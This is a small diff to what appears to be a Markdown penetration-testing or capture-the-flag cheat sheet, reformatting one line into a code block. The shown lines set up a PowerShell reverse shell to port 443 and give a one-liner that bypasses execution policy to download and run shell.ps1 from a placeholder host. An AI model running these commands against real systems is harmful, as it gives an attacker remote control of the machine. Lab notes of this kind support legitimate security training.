@@ -45,7 +45,10 @@ ___
 	echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 443" >> shell.ps1
 	# run HTTP server
 	```
-	* PowerShell command: `powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1');"`
+	* PowerShell command: 
+	  ```powershell 
+	  powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1');"
+	  ```
 
 ___
 
